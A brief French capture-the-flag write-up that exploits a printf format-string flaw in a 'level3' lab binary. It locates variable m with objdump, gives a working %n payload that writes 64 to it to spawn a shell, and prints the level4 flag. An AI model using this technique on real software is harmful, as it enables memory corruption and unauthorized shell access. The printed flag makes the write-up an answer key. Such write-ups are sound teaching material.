## GET Flag

Cet exécutable utilise fgets qui est protégé via une limite de taille le nombre de caractères à lire.

La faille de cet exécutable réside dans le fait que l'utilisateur à la main sur le format de la fonction printf.
L'option: `%n` permet d'écrire le nombre de caractères écrits précédement à l'adresse passée en paramètre.

Il est possible de recupérer l'adresse de `m` avec la commande:

```
$ objdump -t ./level3

% 0804988c g     O .bss	00000004              m
```

Il est ainsi possible d'écrire à l'adresse `0x0804988c` la valeur 64.
Cette variable sera vérifié et un shell sera lancé dans le cas où cette dernière vaudrait 64.

`python -c 'print "\x8c\x98\x04\x08" + "%10x" * 3 + "A" * 30 + "%n" ' > exploit`

`cat exploit - | ./level3`

### Flag

```
level4
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```
